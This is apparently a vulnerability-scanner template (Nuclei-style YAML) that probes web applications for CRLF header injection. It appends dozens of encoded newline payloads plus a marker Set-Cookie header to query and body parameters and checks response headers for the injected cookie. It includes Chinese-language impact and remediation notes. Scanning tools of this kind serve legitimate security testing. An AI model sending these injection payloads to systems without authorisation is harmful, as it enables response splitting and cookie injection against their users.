id: crlf-injection

info:
  name: CRLF 注入探测（DAST）
  author: pdteam
  severity: low
  description: |
    CRLF 注入会让攻击者通过 `%0d%0a` 等换行序列拆分 HTTP 响应头，从而插入新的 Header 或 Cookie。模板向查询参数和请求体追加多种编码换行载荷及 `Set-Cookie: crlfinjection=crlfinjection`，当响应头出现该 Cookie 时确认头部注入成立。
  impact: |
    - 攻击者可注入 Cookie、修改缓存行为、污染重定向或辅助 XSS、响应拆分等攻击链。
    - 代理、CDN 或浏览器对畸形头处理不一致时，漏洞影响可能跨用户或跨缓存层扩散。
  remediation: |
    - 对进入响应头、重定向地址和 Cookie 的所有输入过滤 CR、LF 及其编码变体。
    - 使用框架提供的安全 Header API，避免手工拼接响应头，并在边界层拦截异常换行字符。
  metadata:
    max-request: 41
  tags: crlf,dast,vuln

http:
  - pre-condition:
      - type: dsl
        dsl:
          - 'method == "GET"'
          - 'method == "POST"'
          - 'method == "PUT"'
    payloads:
      escape:
        low:
          - "%00"
          - "%0a"
          - "%0a%20"
          - "%0d"
          - "%0d%09"
          - "%0d%0a"
          - "%0d%0a%09"
          - "%0d%0a%20"
          - "%0d%20"
          - "%20"
        medium:
          - "%20%0a"
          - "%20%0d"
          - "%20%0d%0a"
          - "%23%0a"
          - "%23%0a%20"
          - "%23%0d"
          - "%23%0d%0a"
          - "%23%oa"
          - "%25%30"
          - "%25%30%61"
          - "%2e%2e%2f%0d%0a"
          - "%2f%2e%2e%0d%0a"
          - "%2f..%0d%0a"
          - "%3f"
        high:
          - "%3f%0a"
          - "%3f%0d"
          - "%3f%0d%0a"
          - "%e5%98%8a%e5%98%8d"
          - "%e5%98%8a%e5%98%8d%0a"
          - "%e5%98%8a%e5%98%8d%0d"
          - "%e5%98%8a%e5%98%8d%0d%0a"
          - "%e5%98%8a%e5%98%8d%e5%98%8a%e5%98%8d"
          - "%u0000"
          - "%u000a"
          - "%u000d"
          - "\r"
          - "\r%20"
          - "\r\n"
          - "\r\n%20"
          - "\r\n\t"
          - "\r\t"

    fuzzing:
      - parts:
          - query
          - body
        type: postfix
        fuzz:
          - "{{escape}}Set-Cookie:crlfinjection=crlfinjection"

    stop-at-first-match: true
    matchers:
      - type: regex
        part: header
        regex:
          - '(?m)^(?:Set-Cookie\s*?:(?:\s*?|.*?;\s*?))(crlfinjection=crlfinjection)(?:\s*?)(?:$|;)'
